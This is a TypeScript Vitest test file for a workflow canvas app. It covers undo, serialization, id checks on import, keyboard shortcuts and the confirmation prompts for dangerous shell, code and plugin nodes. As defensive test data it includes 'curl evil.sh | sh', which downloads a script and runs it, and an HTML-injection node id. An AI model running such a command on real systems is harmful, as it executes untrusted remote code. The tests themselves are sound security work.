/* @vitest-environment jsdom */
import { describe, it, expect, vi } from "vitest";
import { InputHandler } from "../canvas/InputHandler";
import { Canvas } from "../canvas/Canvas";
import { Connector } from "../canvas/Connector";
import { CanvasNode } from "../canvas/Node";
import { UndoManager } from "../canvas/UndoManager";
import { serialize, deserialize, registerNodeDescriptors } from "../canvas/CanvasSerializer";
import { checkDangerousNodes } from "../validation";
import type { NodeDescriptor } from "../ipc/workflow";

// CanvasNode → icon-cache → @tauri-apps/api/core (invoke at module level)
vi.mock("@tauri-apps/api/core", () => ({
  invoke: vi.fn(),
  convertFileSrc: vi.fn((p: string) => p),
}));

function makeNode(id: string, typeId = "http_request"): CanvasNode {
  return new CanvasNode({
    id,
    node_type_id: typeId,
    node_type: "action",
    name: `Node ${id}`,
    config: {},
    credentials: {},
    position: { x: 0, y: 0 },
    ports: {
      inputs:  [{ id: "input",  label: "Input",  position: "left"  }],
      outputs: [{ id: "output", label: "Output", position: "right" }],
    },
    input_schema: {},
    output_schema: {},
    retry: { max_attempts: 1, backoff_ms: 500 },
    fallback_node: null,
    dynamic_ports: false,
  });
}

function makeConnector(id: string, fromNode: string, toNode: string): Connector {
  return new Connector({
    id, from_node: fromNode, from_port: "output", to_node: toNode, to_port: "input",
    condition: null, on_success: null, on_failure: null,
  });
}

// ---------------------------------------------------------------------------
// deleteSelected is one undo step; each wire is restored exactly once, and a
// wire between two deleted nodes can never come back dangling.
// ---------------------------------------------------------------------------

describe("Canvas.deleteSelected — atomic undo", () => {
  function setup() {
    const canvas = Object.create(Canvas.prototype) as Canvas & Record<string, unknown>;
    const a = makeNode("A"), b = makeNode("B"), x = makeNode("X");
    canvas.nodes = new Map([["A", a], ["B", b], ["X", x]]);
    const cAB = makeConnector("e_ab", "A", "B");
    const cAX = makeConnector("e_ax", "A", "X");
    canvas.connectors = new Map([["e_ab", cAB], ["e_ax", cAX]]);
    canvas.selectedNodes = new Set(["A", "B"]);
    canvas.selectedNode = null;
    canvas.selectedConn = null;
    canvas.onCanvasChanged = vi.fn();
    canvas.undoMgr = new UndoManager(canvas);
    return { canvas, a, b, x, cAB, cAX };
  }
  const depth = (c: Canvas) => (c.undoMgr as unknown as { stack: unknown[] }).stack.length;

  it("deleting several nodes is one undo step that restores every node and wire exactly once", () => {
    const { canvas, a, b, cAB, cAX } = setup();
    canvas.deleteSelected();
    expect(canvas.nodes.size).toBe(1);
    expect(canvas.connectors.size).toBe(0);
    expect(depth(canvas)).toBe(1);

    canvas.undo();
    expect(canvas.nodes.get("A")).toBe(a);
    expect(canvas.nodes.get("B")).toBe(b);
    expect([...canvas.connectors.keys()].sort()).toEqual(["e_ab", "e_ax"]);
    expect(canvas.connectors.get("e_ab")).toBe(cAB);
    expect(canvas.connectors.get("e_ax")).toBe(cAX);

    canvas.redo();
    expect(canvas.nodes.size).toBe(1);
    expect(canvas.connectors.size).toBe(0);
  });

  it("edge case: a wire selected together with nodes is restored with them, and a stale selection deletes nothing twice", () => {
    const { canvas, cAX } = setup();
    canvas.selectedNodes = new Set(["B"]);
    canvas.selectedConn = cAX;
    canvas.deleteSelected();
    expect(canvas.connectors.size).toBe(0);
    expect(depth(canvas)).toBe(1);

    canvas.undo();
    expect([...canvas.connectors.keys()].sort()).toEqual(["e_ab", "e_ax"]);

    canvas.selectedNodes = new Set();
    canvas.selectedConn = cAX;
    canvas.deleteSelected();
    canvas.selectedConn = cAX;
    canvas.deleteSelected();
    expect(depth(canvas)).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// serialize() must never emit an edge with a missing
// endpoint, regardless of how it became dangling.
// ---------------------------------------------------------------------------

describe("serialize — dangling edge filter", () => {
  it("excludes an edge whose from_node is absent from the node map", () => {
    const n2 = makeNode("n2");
    const nodes = new Map([["n2", n2]]); // "n1" deliberately absent
    const edges = new Map([["e1", makeConnector("e1", "n1", "n2")]]);

    const doc = JSON.parse(serialize("wf_test", "Test", nodes, edges));
    expect(doc.edges).toHaveLength(0);
  });

  it("excludes an edge whose to_node is absent from the node map", () => {
    const n1 = makeNode("n1");
    const nodes = new Map([["n1", n1]]); // "n2" deliberately absent
    const edges = new Map([["e1", makeConnector("e1", "n1", "n2")]]);

    const doc = JSON.parse(serialize("wf_test", "Test", nodes, edges));
    expect(doc.edges).toHaveLength(0);
  });

  it("still includes a normal edge between two present, non-NOTE nodes", () => {
    const n1 = makeNode("n1");
    const n2 = makeNode("n2");
    const nodes = new Map([["n1", n1], ["n2", n2]]);
    const edges = new Map([["e1", makeConnector("e1", "n1", "n2")]]);

    const doc = JSON.parse(serialize("wf_test", "Test", nodes, edges));
    expect(doc.edges).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// deserialize must not trust an imported node/edge id verbatim: a bad-format
// or duplicate id is replaced with the same generated scheme already used
// for an absent id, and a dangling edge is still dropped — both now
// reported via importWarnings instead of failing silently.
// ---------------------------------------------------------------------------

describe("deserialize — imported id validation", () => {
  it("normal case: well-formed, unique ids pass through unchanged with no warnings", () => {
    const doc = { id: "wf1", name: "Test", nodes: [{ id: "n1" }, { id: "n2" }], edges: [{ id: "e1", from_node: "n1", to_node: "n2" }] };
    const rt = deserialize(JSON.stringify(doc));
    expect([...rt.nodes.keys()]).toEqual(["n1", "n2"]);
    expect([...rt.connectors.keys()]).toEqual(["e1"]);
    expect(rt.importWarnings).toEqual([]);
  });

  it("edge case: a node id containing HTML metacharacters is replaced and reported", () => {
    const doc = { id: "wf1", name: "Test", nodes: [{ id: '"><img src=x>' }], edges: [] };
    const rt = deserialize(JSON.stringify(doc));
    const ids = [...rt.nodes.keys()];
    expect(ids).toHaveLength(1);
    expect(ids[0]).not.toBe('"><img src=x>');
    expect(ids[0]).toMatch(/^node_/);
    expect(rt.importWarnings.some(w => w.includes("invalid or duplicate"))).toBe(true);
  });

  it("edge case: two nodes sharing the same id both survive — the second is re-keyed instead of overwriting the first", () => {
    const doc = { id: "wf1", name: "Test", nodes: [{ id: "dup", name: "First" }, { id: "dup", name: "Second" }], edges: [] };
    const rt = deserialize(JSON.stringify(doc));
    expect(rt.nodes.size).toBe(2);
    expect(rt.nodes.get("dup")?.data.name).toBe("First");
    expect([...rt.nodes.values()].map(n => n.data.name)).toEqual(["First", "Second"]);
    expect(rt.importWarnings.some(w => w.includes("invalid or duplicate"))).toBe(true);
  });

  it("a genuinely absent id is still generated silently, same as before — not counted as a warning", () => {
    const doc = { id: "wf1", name: "Test", nodes: [{ name: "No id" }], edges: [] };
    const rt = deserialize(JSON.stringify(doc));
    expect(rt.nodes.size).toBe(1);
    expect(rt.importWarnings).toEqual([]);
  });

  it("an edge referencing a missing node is still dropped — now reported instead of silent", () => {
    const doc = { id: "wf1", name: "Test", nodes: [{ id: "n1" }], edges: [{ id: "e1", from_node: "n1", to_node: "ghost" }] };
    const rt = deserialize(JSON.stringify(doc));
    expect(rt.connectors.size).toBe(0);
    expect(rt.importWarnings.some(w => w.includes("dropped"))).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// checkDangerousNodes must be scoped to the exact node set passed
// in, not any wider notion of "the whole workflow".
// ---------------------------------------------------------------------------

describe("checkDangerousNodes — scoped to the given node set", () => {
  function fakeNode(id: string, typeId: string): CanvasNode {
    return { data: { id, node_type_id: typeId, name: id } } as unknown as CanvasNode;
  }

  it("prompts when a dangerous node is present in the given set", async () => {
    const confirm = vi.fn().mockResolvedValue(true);
    const nodes = [fakeNode("n1", "shell_exec")];
    const ok = await checkDangerousNodes("wf1", nodes, new Set(), confirm);
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(ok).toBe(true);
  });

  it("does not prompt for a dangerous node that is outside the given set (ancestor-subgraph scoping)", async () => {
    const confirm = vi.fn().mockResolvedValue(true);
    // Simulates a single-node test run whose ancestor subgraph contains no
    // dangerous node, even though the full canvas (not passed here) might.
    const subgraphNodes = [fakeNode("n1", "http_request")];
    const ok = await checkDangerousNodes("wf1", subgraphNodes, new Set(), confirm);
    expect(confirm).not.toHaveBeenCalled();
    expect(ok).toBe(true);
  });

  it("does not re-prompt once approved for the same workflow+node-set", async () => {
    const confirm = vi.fn().mockResolvedValue(true);
    const approved = new Set<string>();
    const nodes = [fakeNode("n1", "code")];
    await checkDangerousNodes("wf1", nodes, approved, confirm);
    await checkDangerousNodes("wf1", nodes, approved, confirm);
    expect(confirm).toHaveBeenCalledTimes(1);
  });

  it("returns false and does not remember approval when the user cancels", async () => {
    const confirm = vi.fn().mockResolvedValue(false);
    const approved = new Set<string>();
    const nodes = [fakeNode("n1", "shell_exec")];
    const ok = await checkDangerousNodes("wf1", nodes, approved, confirm);
    expect(ok).toBe(false);
    expect(approved.size).toBe(0);
  });
});

describe("checkDangerousNodes — approval follows node content", () => {
  function shellNode(): CanvasNode {
    return {
      data: {
        id: "n1", node_type_id: "shell_exec", name: "Shell",
        config: { command: "echo hi", env: { MODE: "safe" } },
        credentials: { token: "cred_a" },
      },
    } as unknown as CanvasNode;
  }

  it.each<[string, (n: CanvasNode) => void]>([
    ["a config value",         n => { n.data.config["command"] = "curl evil.sh | sh"; }],
    ["a nested config value",  n => { (n.data.config["env"] as Record<string, unknown>)["MODE"] = "unsafe"; }],
    ["a credential reference", n => { n.data.credentials["token"] = "cred_b"; }],
    ["the enabled state",      n => { n.data.disabled = true; }],
    ["the node type",          n => { n.data.node_type_id = "code"; }],
  ])("asks again after %s changes on an already-approved node", async (_label, mutate) => {
    const confirm = vi.fn().mockResolvedValue(true);
    const approved = new Set<string>();
    const node = shellNode();
    await checkDangerousNodes("wf1", [node], approved, confirm);
    mutate(node);
    const ok = await checkDangerousNodes("wf1", [node], approved, confirm);
    expect(confirm).toHaveBeenCalledTimes(2);
    expect(ok).toBe(true);
  });

  it("does not ask again when the same config only has its keys in a different order", async () => {
    const confirm = vi.fn().mockResolvedValue(true);
    const approved = new Set<string>();
    const node = shellNode();
    await checkDangerousNodes("wf1", [node], approved, confirm);
    node.data.config = { env: { MODE: "safe" }, command: "echo hi" };
    await checkDangerousNodes("wf1", [node], approved, confirm);
    expect(confirm).toHaveBeenCalledTimes(1);
  });

  it("keeps config values, such as a connection URL with a password, out of the stored approval", async () => {
    const approved = new Set<string>();
    const node = shellNode();
    node.data.config["connection_url"] = "postgres://user:hunter2@db.internal/app";
    await checkDangerousNodes("wf1", [node], approved, vi.fn().mockResolvedValue(true));
    expect(approved.size).toBe(1);
    expect([...approved].join("\n")).not.toContain("hunter2");
  });
});

describe("checkDangerousNodes — confirmation text", () => {
  const SHELL: NodeDescriptor = {
    type_id: "shell_exec", display_name: "Shell Command", node_type: "action", version: "1",
    input_schema: {}, output_schema: {},
    ports: { inputs: [], outputs: [] },
  };

  it("names the node type next to a misleading user-chosen name", async () => {
    registerNodeDescriptors([SHELL]);
    const confirm = vi.fn().mockResolvedValue(false);
    const node = { data: { id: "n1", node_type_id: "shell_exec", name: "Weather lookup" } } as unknown as CanvasNode;
    await checkDangerousNodes("wf1", [node], new Set(), confirm);
    registerNodeDescriptors([]);
    expect(confirm.mock.calls[0][0]).toContain("Weather lookup (Shell Command)");
  });

  it("shows the type once when the node still carries its default name", async () => {
    registerNodeDescriptors([SHELL]);
    const confirm = vi.fn().mockResolvedValue(false);
    const node = { data: { id: "n1", node_type_id: "shell_exec", name: "Shell Command" } } as unknown as CanvasNode;
    await checkDangerousNodes("wf1", [node], new Set(), confirm);
    registerNodeDescriptors([]);
    const msg = confirm.mock.calls[0][0] as string;
    expect(msg).toContain("Shell Command");
    expect(msg).not.toContain("Shell Command (Shell Command)");
  });
});

// ---------------------------------------------------------------------------
// checkDangerousNodes must also prompt for plugin nodes: they get resolved
// credential values merged into their input and have outbound HTTP access by
// design, but sit outside DANGEROUS_NODE_IDS entirely.
// ---------------------------------------------------------------------------

describe("checkDangerousNodes — plugin nodes", () => {
  function fakeNode(id: string, typeId: string): CanvasNode {
    return { data: { id, node_type_id: typeId, name: id } } as unknown as CanvasNode;
  }

  const PLUGIN_DESCRIPTOR: NodeDescriptor = {
    type_id: "my_plugin_node", display_name: "My Plugin", node_type: "action", version: "1",
    input_schema: {}, output_schema: {},
    ports: { inputs: [{ id: "input", label: "In", position: "left" }], outputs: [{ id: "output", label: "Out", position: "right" }] },
    is_plugin: true,
  };

  it("prompts for a node whose descriptor is registered as is_plugin, even though it's not in DANGEROUS_NODE_IDS", async () => {
    registerNodeDescriptors([PLUGIN_DESCRIPTOR]);
    const confirm = vi.fn().mockResolvedValue(true);
    const nodes = [fakeNode("n1", "my_plugin_node")];
    const ok = await checkDangerousNodes("wf1", nodes, new Set(), confirm);
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(ok).toBe(true);
  });

  it("does not prompt for a registered built-in (non-plugin, non-dangerous) node type", async () => {
    registerNodeDescriptors([{ ...PLUGIN_DESCRIPTOR, type_id: "http_request", is_plugin: false }]);
    const confirm = vi.fn().mockResolvedValue(true);
    const nodes = [fakeNode("n1", "http_request")];
    const ok = await checkDangerousNodes("wf1", nodes, new Set(), confirm);
    expect(confirm).not.toHaveBeenCalled();
    expect(ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Space must toggle only the palette while a role="button" control (e.g.
// #drawer-header) has keyboard focus, never also #output-drawer. onKey is
// bound at `window` (Canvas.ts), so every keydown app-wide reaches it; these
// exercise that global reach directly against real focused DOM elements.
// ---------------------------------------------------------------------------

describe("InputHandler — Space palette shortcut vs. focused role=\"button\" controls", () => {
  function makeFakeCanvas(el: HTMLElement) {
    return {
      el,
      onPaletteRequest: vi.fn(),
    };
  }

  it("normal case: Space opens the palette when focus is on the canvas itself", () => {
    document.body.innerHTML = `<div id="fake-canvas" tabindex="0"></div>`;
    const el = document.getElementById("fake-canvas")!;
    el.focus();
    const canvas = makeFakeCanvas(el);
    const input = new InputHandler(canvas as unknown as Canvas);

    input.onKey(new KeyboardEvent("keydown", { code: "Space", key: " " }));
    expect(canvas.onPaletteRequest).toHaveBeenCalledTimes(1);
  });

  it("normal case: Space opens the palette when nothing in particular has focus (document.body)", () => {
    document.body.innerHTML = `<div id="fake-canvas" tabindex="0"></div>`;
    const el = document.getElementById("fake-canvas")!;
    const canvas = makeFakeCanvas(el);
    const input = new InputHandler(canvas as unknown as Canvas);

    expect(document.activeElement).toBe(document.body);
    input.onKey(new KeyboardEvent("keydown", { code: "Space", key: " " }));
    expect(canvas.onPaletteRequest).toHaveBeenCalledTimes(1);
  });

  it("the bug this guards against: Space does NOT also open the palette while a role=\"button\" control (e.g. #drawer-header) has focus", () => {
    document.body.innerHTML = `
      <div id="fake-canvas" tabindex="0"></div>
      <div class="drawer-header" id="drawer-header" role="button" tabindex="0"></div>
    `;
    const el = document.getElementById("fake-canvas")!;
    const header = document.getElementById("drawer-header")!;
    header.focus();
    expect(document.activeElement).toBe(header);

    const canvas = makeFakeCanvas(el);
    const input = new InputHandler(canvas as unknown as Canvas);
    input.onKey(new KeyboardEvent("keydown", { code: "Space", key: " " }));
    expect(canvas.onPaletteRequest).not.toHaveBeenCalled();
  });

  it("related fix, same root cause: Space does not fire the palette while a native <button> has focus either", () => {
    document.body.innerHTML = `
      <div id="fake-canvas" tabindex="0"></div>
      <button id="some-btn">Run</button>
    `;
    const el = document.getElementById("fake-canvas")!;
    document.getElementById("some-btn")!.focus();

    const canvas = makeFakeCanvas(el);
    const input = new InputHandler(canvas as unknown as Canvas);
    input.onKey(new KeyboardEvent("keydown", { code: "Space", key: " " }));
    expect(canvas.onPaletteRequest).not.toHaveBeenCalled();
  });

  it("edge case: Ctrl/Cmd+K still opens the palette regardless of focus (no conflicting binding on any control)", () => {
    document.body.innerHTML = `
      <div id="fake-canvas" tabindex="0"></div>
      <div class="drawer-header" id="drawer-header" role="button" tabindex="0"></div>
    `;
    const el = document.getElementById("fake-canvas")!;
    document.getElementById("drawer-header")!.focus();

    const canvas = makeFakeCanvas(el);
    const input = new InputHandler(canvas as unknown as Canvas);
    input.onKey(new KeyboardEvent("keydown", { key: "k", ctrlKey: true }));
    expect(canvas.onPaletteRequest).toHaveBeenCalledTimes(1);
  });
});
